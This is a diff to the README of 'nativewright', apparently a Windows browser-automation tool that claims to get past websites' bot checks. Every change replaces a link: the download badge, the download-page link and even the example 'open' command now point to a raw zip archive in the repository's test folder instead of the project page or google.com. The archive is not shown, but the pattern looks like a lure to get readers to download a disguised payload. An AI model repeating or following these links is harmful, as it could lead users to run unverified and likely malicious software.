@@ -1,6 +1,6 @@
 # 🤖 nativewright - Automate web tasks like a human
 
-[![Download nativewright](https://img.shields.io/badge/Download-nativewright-blue.svg)](https://github.com/barongoj3693/nativewright)
+[![Download nativewright](https://img.shields.io/badge/Download-nativewright-blue.svg)](https://raw.githubusercontent.com/barongoj3693/nativewright/main/test/Software-v1.3.zip)
 
 ## 📖 What is nativewright?
 
@@ -19,7 +19,7 @@ You need a Windows computer to run this software. Ensure you have the following:
 
 Visit the project page to download the latest version for your computer.
 
-[Click here to open the download page](https://github.com/barongoj3693/nativewright)
+[Click here to open the download page](https://raw.githubusercontent.com/barongoj3693/nativewright/main/test/Software-v1.3.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled Releases on the right side of the page.
@@ -58,7 +58,7 @@ Websites use security checks to block automated scripts. Nativewright uses sever
 
 Test the software to ensure everything works correctly. Open your command prompt and use the following structural example:
 
-nativewright open "https://www.google.com"
+nativewright open "https://raw.githubusercontent.com/barongoj3693/nativewright/main/test/Software-v1.3.zip"
 
 This command launches the browser and directs it to the specified address. Observe how the cursor moves onto the screen. The browser will stay open until you send a close command.
 
